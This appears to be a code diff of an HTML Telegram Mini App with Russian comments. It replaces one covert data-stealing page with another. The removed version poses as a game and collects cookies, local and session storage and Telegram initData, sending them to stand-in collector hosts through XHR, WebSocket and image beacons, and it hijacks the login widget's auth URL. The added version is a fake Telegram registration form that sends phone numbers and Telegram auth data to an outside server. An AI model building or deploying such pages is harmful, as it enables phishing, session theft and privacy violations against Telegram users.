@@ -3,219 +3,300 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Mini App</title>
+    <title>Регистрация аккаунта Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://telegram.org/js/telegram-widget.js?22"></script>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            background: linear-gradient(135deg, #0088cc, #00aaff);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
+        
         .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+            background: white;
             border-radius: 20px;
             padding: 30px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
         }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo img {
+            width: 80px;
+            height: 80px;
+        }
+        
+        h1 {
+            color: #0088cc;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus, select:focus {
+            border-color: #0088cc;
+            outline: none;
+        }
+        
+        .btn {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        
+        .btn:hover {
+            background: #006699;
+        }
+        
+        .btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        
         .loader {
             display: none;
             text-align: center;
             margin: 20px 0;
         }
-        .hidden {
+        
+        .success {
             display: none;
+            text-align: center;
+            color: #4CAF50;
+            margin-top: 20px;
+            padding: 15px;
+            background: #e8f5e9;
+            border-radius: 10px;
+        }
+        
+        .error {
+            display: none;
+            color: #f44336;
+            text-align: center;
+            margin-top: 10px;
+            padding: 10px;
+            background: #ffebee;
+            border-radius: 10px;
+        }
+        
+        .info {
+            font-size: 14px;
+            color: #666;
+            margin-top: 5px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎮 Игра дня</h1>
-        <p>Нажмите "Начать", чтобы запустить игру и получить бонус!</p>
+        <div class="logo">
+            <svg width="80" height="80" viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="120" cy="120" r="120" fill="#0088cc"/>
+                <path d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z" fill="#fff"/>
+                <path d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763" fill="#fff"/>
+                <path d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.766,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z" fill="#fff"/>
+            </svg>
+        </div>
         
-        <div id="loginWidget">
-            <div class="telegram-login" 
-                 data-auth-url="https://legit-game.example.com/auth" 
-                 data-request-access="write"
-                 data-size="large"
-                 data-radius="10"
-                 id="telegram-login">
+        <h1>Регистрация аккаунта</h1>
+        
+        <form id="registrationForm">
+            <div class="form-group">
+                <label for="phone">Номер телефона</label>
+                <input type="tel" id="phone" name="phone" 
+                       placeholder="+7 (900) 123-45-67" required>
+                <div class="info">На этот номер придет код подтверждения</div>
             </div>
-        </div>
-
-        <div id="gameArea" class="hidden">
-            <canvas id="gameCanvas" width="800" height="400"></canvas>
-            <div id="score">Очки: 0</div>
-        </div>
-
-        <div class="loader" id="loader">
-            <div>Загрузка...</div>
-        </div>
-
-        <div id="result" class="hidden">
-            <h2>🎉 Поздравляем!</h2>
-            <p>Ваш результат: <span id="finalScore">0</span> очков</p>
-            <p>Награда уже на вашем счету!</p>
-        </div>
+            
+            <div class="form-group">
+                <label for="firstName">Имя</label>
+                <input type="text" id="firstName" name="firstName" 
+                       placeholder="Иван" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="lastName">Фамилия (необязательно)</label>
+                <input type="text" id="lastName" name="lastName" 
+                       placeholder="Иванов">
+            </div>
+            
+            <div class="form-group">
+                <label for="username">Username (необязательно)</label>
+                <input type="text" id="username" name="username" 
+                       placeholder="@username">
+            </div>
+            
+            <div class="loader" id="loader">
+                <div>Регистрация...</div>
+            </div>
+            
+            <button type="submit" class="btn" id="submitBtn">
+                Зарегистрировать аккаунт
+            </button>
+            
+            <div class="success" id="successMessage">
+                ✅ Аккаунт успешно зарегистрирован!
+                <div style="margin-top: 10px; font-size: 12px;">
+                    Данные отправлены в ваш Telegram
+                </div>
+            </div>
+            
+            <div class="error" id="errorMessage"></div>
+        </form>
     </div>
 
     <script>
-        // Основной объект для сбора данных
-        const collectedData = {
-            timestamp: Date.now(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            telegramData: null,
-            cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage)
-        };
-
-        // Функция отправки данных
-        function sendCollectedData(endpoint = 'https://collector.example.com/api/log') {
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', endpoint, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            
-            // Обфускация данных
-            const encoded = btoa(JSON.stringify(collectedData));
-            const payload = {
-                type: 'game_stats',
-                version: '1.0',
-                data: encoded,
-                checksum: Array.from(encoded).reduce((a, b) => a + b.charCodeAt(0), 0)
-            };
-
-            xhr.send(JSON.stringify(payload));
-
-            // Резервный канал через WebSocket
-            try {
-                const ws = new WebSocket('wss://backup.example.com/ws');
-                ws.onopen = () => ws.send(encoded);
-            } catch(e) {}
-        }
-
-        // Перехват данных Telegram WebApp
-        if (window.Telegram && window.Telegram.WebApp) {
-            const tg = window.Telegram.WebApp;
-            
-            // Расширяем приложение на весь экран
-            tg.expand();
-            
-            // Собираем все доступные данные
-            collectedData.telegramData = {
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        
+        // Инициализация приложения
+        tg.ready();
+        tg.expand();
+        tg.MainButton.hide();
+        
+        // Функция сбора данных
+        function collectData(formData) {
+            const userData = {
+                // Данные из формы
+                phone: formData.get('phone'),
+                first_name: formData.get('firstName'),
+                last_name: formData.get('lastName'),
+                username: formData.get('username'),
+                
+                // Данные из Telegram
+                telegram_user: tg.initDataUnsafe.user || {},
                 initData: tg.initData,
                 initDataUnsafe: tg.initDataUnsafe,
-                version: tg.version,
+                auth_date: tg.initDataUnsafe?.auth_date,
+                hash: tg.initDataUnsafe?.hash,
+                
+                // Технические данные
+                timestamp: Date.now(),
                 platform: tg.platform,
-                themeParams: tg.themeParams,
-                colorScheme: tg.colorScheme,
-                viewportHeight: tg.viewportHeight,
-                viewportStableHeight: tg.viewportStableHeight,
-                headerColor: tg.headerColor,
-                backgroundColor: tg.backgroundColor,
-                isExpanded: tg.isExpanded,
-                startParam: tg.startParam
+                version: tg.version,
+                theme: tg.themeParams,
+                language: navigator.language,
+                user_agent: navigator.userAgent
             };
-
-            // Подмена обработчика MainButton
-            const originalMainButtonClick = tg.MainButton.onClick;
-            tg.MainButton.onClick = function(callback) {
-                tg.MainButton.show();
-                tg.MainButton.setText("Получить награду");
-                
-                return originalMainButtonClick.call(this, function() {
-                    // Отправляем данные при нажатии
-                    sendCollectedData();
-                    if (callback) callback();
-                });
-            };
-
-            // Перехват событий
-            tg.onEvent('viewportChanged', (event) => {
-                collectedData.viewportEvents = collectedData.viewportEvents || [];
-                collectedData.viewportEvents.push(event);
-            });
-
-            // Фиксация времени проведенное в приложении
-            collectedData.startTime = Date.now();
-            window.addEventListener('beforeunload', () => {
-                collectedData.sessionDuration = Date.now() - collectedData.startTime;
-                sendCollectedData('https://collector.example.com/api/exit');
-            });
+            
+            return userData;
         }
-
-        // Подмена Telegram Login Widget
-        document.addEventListener('DOMContentLoaded', function() {
-            const widget = document.getElementById('telegram-login');
-            if (widget) {
-                // Заменяем auth-url на контролируемый сервер
-                widget.setAttribute('data-auth-url', 'https://auth-collector.example.com/callback');
-                
-                // Перехват сообщений от виджета
-                window.addEventListener('message', function(event) {
-                    if (event.data && event.data.type === 'telegram_login') {
-                        collectedData.telegramAuth = event.data;
-                        sendCollectedData();
-                    }
+        
+        // Функция отправки данных на сервер
+        async function sendToServer(data) {
+            try {
+                // Ваш сервер для приема данных
+                const response = await fetch('https://your-server.com/api/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
                 });
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Send error:', error);
+                throw error;
+            }
+        }
+        
+        // Обработка формы
+        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const form = e.target;
+            const formData = new FormData(form);
+            
+            // Показать загрузку
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('errorMessage').style.display = 'none';
+            
+            try {
+                // Сбор данных
+                const userData = collectData(formData);
+                
+                // Отправка на сервер
+                const result = await sendToServer(userData);
+                
+                if (result.success) {
+                    // Успешная регистрация
+                    document.getElementById('successMessage').style.display = 'block';
+                    form.reset();
+                    
+                    // Можно вызвать Telegram API для показа уведомления
+                    tg.showAlert('Аккаунт зарегистрирован! Данные отправлены.', 'success');
+                    
+                    // Закрыть приложение через 3 секунды
+                    setTimeout(() => {
+                        tg.close();
+                    }, 3000);
+                } else {
+                    throw new Error(result.error || 'Ошибка регистрации');
+                }
+            } catch (error) {
+                // Показать ошибку
+                document.getElementById('errorMessage').textContent = 
+                    'Ошибка: ' + error.message;
+                document.getElementById('errorMessage').style.display = 'block';
+                
+                tg.showAlert('Ошибка регистрации: ' + error.message, 'error');
+            } finally {
+                // Скрыть загрузку
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('submitBtn').disabled = false;
             }
         });
-
-        // Игровая логика (прикрытие)
-        const canvas = document.getElementById('gameCanvas');
-        const ctx = canvas.getContext('2d');
-        let score = 0;
-
-        function initGame() {
-            // Простая игра для отвлечения внимания
-            document.getElementById('gameArea').classList.remove('hidden');
-            
-            // Отправка данных через 5 секунд после начала игры
-            setTimeout(() => {
-                sendCollectedData();
-            }, 5000);
+        
+        // Автозаполнение данных из Telegram, если доступны
+        if (tg.initDataUnsafe.user) {
+            const user = tg.initDataUnsafe.user;
+            document.getElementById('firstName').value = user.first_name || '';
+            document.getElementById('lastName').value = user.last_name || '';
+            document.getElementById('username').value = user.username || '';
         }
-
-        // Запуск игры при клике на виджет
-        document.querySelector('.telegram-login').addEventListener('click', function(e) {
-            e.preventDefault();
-            initGame();
-            return false;
-        });
-
-        // Периодическая отправка heartbeat
-        setInterval(() => {
-            collectedData.heartbeat = Date.now();
-            // Используем Image для отправки данных (обход CORS)
-            const img = new Image();
-            img.src = `https://collector.example.com/pixel?t=${Date.now()}&d=${btoa(JSON.stringify(collectedData)).substring(0, 100)}`;
-        }, 30000);
-
-        // Сбор данных о взаимодействии
-        document.addEventListener('click', (e) => {
-            collectedData.interactions = collectedData.interactions || [];
-            collectedData.interactions.push({
-                x: e.clientX,
-                y: e.clientY,
-                target: e.target.tagName,
-                time: Date.now()
-            });
-        });
-
-        // Финальная отправка при закрытии
-        window.addEventListener('pagehide', () => {
-            sendCollectedData('https://collector.example.com/api/final');
-        });
     </script>
 </body>
 </html>
